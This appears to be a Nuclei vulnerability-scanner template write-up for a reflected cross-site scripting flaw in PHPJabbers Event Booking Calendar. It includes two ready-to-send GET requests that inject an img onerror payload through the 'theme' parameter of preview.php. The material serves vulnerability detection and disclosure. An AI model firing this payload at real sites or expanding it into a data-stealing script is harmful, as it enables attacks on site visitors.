# Nuclei Template: PHPJabbers Event Booking Calendar - Reflected XSS
**Template ID:** phpjabbers-event-booking-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`phpjabbers-event-booking-xss.yaml`)

## Vulnerability Information & PoC

## Description
Detected that PHPJabbers Event Booking Calendar contained a reflected cross-site scripting vulnerability in the preview.php endpoint

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/scripts/event-booking-calendar/preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3Etest
GET {{BaseURL}}/preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3Etest
```

## References
- https://cxsecurity.com/issue/WLB-2026050008
- https://www.phpjabbers.com/event-booking-calendar/
